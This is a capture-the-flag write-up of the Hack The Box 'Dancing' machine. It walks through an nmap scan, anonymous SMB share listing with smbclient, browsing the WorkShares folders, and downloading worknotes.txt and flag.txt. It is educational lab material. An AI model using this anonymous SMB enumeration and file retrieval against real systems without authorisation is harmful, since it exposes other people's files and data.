# Hack The Box — Dancing

## Machine Information

| Property | Details |
|----------|---------|
| Platform | Hack The Box |
| Module | Starting Point |
| Machine | Dancing |
| Category | SMB / Windows |
| Operating System | Windows |
| Difficulty | Very Easy |
| Status | Completed |

---

## Objective

The objective of this challenge was to enumerate the target, identify the exposed SMB service, access an available SMB share, enumerate its contents, and retrieve the flag.

---

# 1. Reconnaissance

The target IP address was:

```text
10.129.129.148
```

I started with an Nmap service/version scan.

```bash
sudo nmap -sV 10.129.129.148
```

### Nmap Output

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-31 21:37 IST
Nmap scan report for 10.129.129.148
Host is up (0.78s latency).
Not shown: 996 closed tcp ports (reset)

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

---

# 2. Nmap Enumeration

The scan revealed four interesting open ports:

| Port | Service | Observation |
|------|---------|-------------|
| 135 | MSRPC | Microsoft RPC |
| 139 | NetBIOS-SSN | NetBIOS session service |
| 445 | SMB | Microsoft-DS / SMB |
| 5985 | HTTP | WinRM-related HTTP service |

The most interesting service for this challenge was **SMB on port 445**.

SMB commonly provides access to shared files and directories on Windows systems.

The presence of ports **139 and 445** suggested that SMB enumeration should be the next step.

---

# 3. SMB Share Enumeration

I used `smbclient` to enumerate the available SMB shares.

The initial command:

```bash
smbclient -L
```

was incomplete because the target was not specified.

I then used:

```bash
smbclient -L //10.129.129.148 -N
```

The `-L` option lists available shares, while `-N` attempts the connection without requesting a password.

### Output

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

There were **4 SMB shares**:

```text
ADMIN$
C$
IPC$
WorkShares
```

---

# 4. Understanding the SMB Shares

The first three shares are common Windows administrative/system shares:

```text
ADMIN$
C$
IPC$
```

The interesting share was:

```text
WorkShares
```

Unlike the administrative shares, `WorkShares` appeared to be intended for storing user files.

The next step was therefore to connect to it.

---

# 5. Anonymous SMB Access

I connected to the `WorkShares` share without providing credentials:

```bash
smbclient //10.129.129.148/WorkShares -N
```

The connection was successful:

```text
Try "help" to get a list of possible commands.

smb: \>
```

This confirmed that the SMB share allowed access without requiring a username/password.

### Finding

**Anonymous access to the `WorkShares` SMB share was possible.**

This allowed further enumeration of the share contents.

---

# 6. Enumerating WorkShares

Inside the SMB shell, I used:

```text
ls
```

The output was:

```text
.                                   D        0  Mon Mar 29 13:52:01 2021
..                                  D        0  Mon Mar 29 13:52:01 2021
Amy.J                               D        0  Mon Mar 29 14:38:24 2021
James.P                             D        0  Thu Jun  3 14:08:03 2021
```

Two directories were discovered:

```text
Amy.J
James.P
```

At this point, the next step was to enumerate both directories.

---

# 7. Enumerating Amy.J

I entered the `Amy.J` directory:

```text
smb: \> cd Amy.J
```

Then listed its contents:

```text
smb: \Amy.J\> ls
```

The output was:

```text
.                                   D        0  Mon Mar 29 14:38:24 2021
..                                  D        0  Mon Mar 29 14:38:24 2021
worknotes.txt                       A       94  Fri Mar 26 16:30:37 2021
```

A file named:

```text
worknotes.txt
```

was discovered.

---

# 8. Downloading worknotes.txt

The SMB shell provides the `get` command for downloading files.

I used:

```text
smb: \Amy.J\> get worknotes.txt
```

The file was successfully downloaded:

```text
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt
```

I initially tried:

```text
smb: \Amy.J\> cat worknotes.txt
```

However, `cat` is a Linux shell command and is not an `smbclient` command.

The correct approach was to exit the SMB shell and read the downloaded file from the local terminal.

```text
smb: \Amy.J\> exit
```

Then:

```bash
cat worknotes.txt
```

---

# 9. Contents of worknotes.txt

The file contained:

```text
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing
```

This provided information about the environment and specifically mentioned:

```text
setup winrm on dancing
```

The Nmap scan had already identified:

```text
5985/tcp open
```

which is commonly associated with WinRM.

However, the file was not required to retrieve the flag because another directory contained the flag directly.

---

# 10. Enumerating James.P

I reconnected to the SMB share:

```bash
smbclient //10.129.129.148/WorkShares -N
```

Then entered the second directory:

```text
smb: \> cd James.P
```

I enumerated its contents:

```text
smb: \James.P\> ls
```

The output was:

```text
.                                   D        0  Thu Jun  3 14:08:03 2021
..                                  D        0  Thu Jun  3 14:08:03 2021
flag.txt                            A       32  Mon Mar 29 14:56:57 2021
```

A file named:

```text
flag.txt
```

was found.

---

# 11. Downloading the Flag

I used the SMB `get` command:

```text
smb: \James.P\> get flag.txt
```

The file was downloaded to my local machine.

I then exited the SMB shell:

```text
smb: \James.P\> exit
```

And read the downloaded file:

```bash
cat flag.txt
```

This displayed the HTB flag.

---

# 12. Attack Path

The complete attack path was:

```text
Target
  |
  v
Nmap Enumeration
  |
  v
SMB discovered on port 445
  |
  v
Enumerate SMB shares
  |
  v
4 shares discovered
  |
  v
WorkShares
  |
  v
Anonymous SMB access
  |
  v
Enumerate WorkShares
  |
  +-------------------+
  |                   |
  v                   v
Amy.J               James.P
  |                   |
  v                   v
worknotes.txt        flag.txt
  |                   |
  v                   v
Download             Download
  |                   |
  +---------+---------+
            |
            v
          FLAG
```

---

# 13. Commands Used

## Nmap

```bash
sudo nmap -sV 10.129.129.148
```

## Enumerate SMB Shares

```bash
smbclient -L //10.129.129.148 -N
```

## Connect to WorkShares

```bash
smbclient //10.129.129.148/WorkShares -N
```

## SMB Enumeration

```text
ls
cd <directory>
get <file>
exit
```

## Read Downloaded Files

```bash
cat worknotes.txt
cat flag.txt
```

---

# 14. Important SMB Commands

| Command | Purpose |
|---------|---------|
| `ls` | List files and directories |
| `cd <directory>` | Enter a directory |
| `cd ..` | Go to the parent directory |
| `get <file>` | Download a file |
| `pwd` | Show current SMB directory |
| `help` | Show available SMB commands |
| `exit` | Exit the SMB shell |

---

# 15. Key Findings

### Open SMB Service

```text
445/tcp
```

SMB was exposed and became the primary attack surface.

### Anonymous Access

The `WorkShares` share could be accessed without credentials:

```bash
smbclient //10.129.129.148/WorkShares -N
```

### Share Enumeration

Four shares were discovered:

```text
ADMIN$
C$
IPC$
WorkShares
```

### File Enumeration

`WorkShares` contained:

```text
Amy.J/
James.P/
```

`Amy.J` contained:

```text
worknotes.txt
```

`James.P` contained:

```text
flag.txt
```

---

# 16. Lessons Learned

## 1. Enumerate Before Exploiting

The first useful step was not exploitation. It was identifying the services exposed by the target.

```text
Nmap
  |
  v
SMB
  |
  v
Share Enumeration
```

---

## 2. SMB Shares Can Expose Sensitive Files

An accessible SMB share can reveal:

```text
Documents
Credentials
Configuration files
Scripts
Notes
Flags
Sensitive information
```

Therefore, SMB shares should always be enumerated when ports 139 or 445 are exposed.

---

## 3. Test Anonymous Access

The `-N` option allowed SMB enumeration without supplying a password:

```bash
smbclient -L //10.129.129.148 -N
```

If anonymous access works, the available shares should be investigated carefully.

---

## 4. Enumerate Recursively

Finding a share is only the beginning.

The enumeration continued:

```text
WorkShares
    |
    +-- Amy.J
    |     |
    |     +-- worknotes.txt
    |
    +-- James.P
          |
          +-- flag.txt
```

The flag was not located at the root of the share, so directory enumeration was necessary.

---

## 5. Know Your Tool's Commands

Inside `smbclient`, commands such as:

```text
ls
cd
get
exit
```

are used.

Linux commands such as:

```text
cat
```

must be executed after returning to the local shell.

---

# 17. Final Flag

The flag was retrieved from:

```text
WorkShares/James.P/flag.txt
```

The file was downloaded using:

```text
get flag.txt
```

and then read locally using:

```bash
cat flag.txt
```

---

# Conclusion

The **Dancing** challenge demonstrated a simple but important Windows/SMB enumeration workflow.

The key attack path was:

```text
Nmap
    |
    v
SMB : 445
    |
    v
Anonymous Share Enumeration
    |
    v
WorkShares
    |
    v
Directory Enumeration
    |
    v
James.P
    |
    v
flag.txt
    |
    v
FLAG
```

The main takeaway is:

> **When SMB is exposed, enumerate the shares and investigate what can be accessed anonymously before looking for more complicated attack paths.**

---

## Disclaimer

This writeup documents activity performed against an intentionally vulnerable **Hack The Box** machine for educational purposes.

Do not use these techniques against systems without explicit authorization.
